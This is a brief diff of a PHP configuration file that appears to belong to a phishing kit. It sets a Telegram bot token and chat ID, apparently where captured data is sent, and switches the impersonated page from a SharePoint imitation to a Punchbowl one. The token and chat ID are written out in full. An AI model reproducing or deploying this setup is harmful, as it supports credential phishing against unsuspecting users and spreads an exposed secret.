@@ -7,6 +7,6 @@ $api_prefix = "awzfywkm";
 $telegram_bot_token = "8821840739:AAE9-7eB8-X2ype9qUxab7y4xLwotzCcIx4";
 $telegram_chat_id = "8793948257";
 
-$page_name = "sharepoint_1";
+$page_name = "punchbowl_1";
 
 ?>
